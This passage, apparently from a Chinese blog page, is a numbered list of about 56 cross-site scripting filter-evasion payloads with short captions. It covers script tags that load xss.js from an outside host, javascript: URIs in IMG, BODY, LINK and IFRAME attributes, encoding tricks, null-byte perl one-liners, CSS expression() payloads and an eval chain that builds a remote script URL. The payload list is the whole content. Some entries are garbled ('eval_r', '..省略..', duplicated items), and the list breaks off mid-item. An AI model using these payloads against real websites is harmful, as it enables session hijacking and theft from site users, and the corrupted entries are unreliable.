</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">(1)普通的XSS JavaScript注入</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(2)IMG标签XSS使用JavaScript命令</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(3)IMG标签无分号无引号</span><br><span class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(4)IMG标签大小写不敏感</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(5)HTML编码(必须有分号)</span><br><span class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</span><br><span class="line"></span><br><span class="line">(6)修正缺陷IMG标签</span><br><span class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</span><br><span class="line"></span><br><span class="line">(7)formCharCode标签(计算器)</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line"></span><br><span class="line">(8)UTF-8的Unicode编码(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br><span class="line"></span><br><span class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br><span class="line"></span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"></span><br><span class="line">(11)嵌入式标签,将Javascript分开</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(12)嵌入式编码标签,将Javascript分开</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(13)嵌入式换行符</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(14)嵌入式回车</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</span><br><span class="line">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</span><br><span class="line"></span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line">&lt;script&gt;z=’document.’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">(17)空字符</span><br><span class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</span><br><span class="line"></span><br><span class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</span><br><span class="line"></span><br><span class="line">(19)Spaces和meta前的IMG标签</span><br><span class="line">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</span><br><span class="line"></span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(23)双开括号</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line"></span><br><span class="line">(25)无结束脚本标记2</span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line"></span><br><span class="line">(26)半开的HTML/JavaScript XSS</span><br><span class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</span><br><span class="line"></span><br><span class="line">(27)双开角括号</span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line"></span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/</span><br><span class="line">alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(29)换码过滤的JavaScript</span><br><span class="line">\”;alert(‘XSS’);//</span><br><span class="line"></span><br><span class="line">(30)结束Title标签</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(31)Input Image</span><br><span class="line">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(32)BODY Image</span><br><span class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(33)BODY标签</span><br><span class="line">&lt;BODY(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(34)IMG Dynsrc</span><br><span class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(35)IMG Lowsrc</span><br><span class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(36)BGSOUND</span><br><span class="line">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(37)STYLE sheet</span><br><span class="line">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(38)远程样式表</span><br><span class="line">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</span><br><span class="line"></span><br><span class="line">(39)List-style-image(列表式)</span><br><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line"></span><br><span class="line">(40)IMG VBscript</span><br><span class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line"></span><br><span class="line">(41)META链接url</span><br><span class="line">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(42)Iframe</span><br><span class="line">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</span><br><span class="line"></span><br><span class="line">(43)Frame</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</span><br><span class="line"></span><br><span class="line">(44)Table</span><br><span class="line">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(45)TD</span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(46)DIV background-image</span><br><span class="line">&lt;DIV STYLE=”background-image: none)”&gt;</span><br><span class="line"></span><br><span class="line">(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</span><br><span class="line">&lt;DIV STYLE=”background-image: none)”&gt;</span><br><span class="line"></span><br><span class="line">(48)DIV expression</span><br><span class="line">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</span><br><span class="line"></span><br><span class="line">(49)STYLE属性分拆表达</span><br><span class="line">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span><br><span class="line"></span><br><span class="line">(50)匿名STYLE(组成:开角号和一个字母开头)</span><br><span class="line">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span><br><span class="line"></span><br><span class="line">(51)STYLE background-image</span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(52)IMG STYLE方式</span><br><span class="line">exppression(alert(“XSS”))’&gt;</span><br><span class="line"></span><br><span class="line">(53)STYLE background</span><br><span class="line">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</span><br><span class="line"></span><br><span class="line">(54)BASE</span><br><span class="line">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</span><br><span class="line"></span><br><span class="line">(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</span><br><span class="line">&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;</span><br><span class="line"></span><br><span class="line">(56)在flash中使用ActionScrpt可以混进你XSS的代码</span><br><span class="line">a=”get”;</span><br><span class="line">b=”URL(\”&quot;
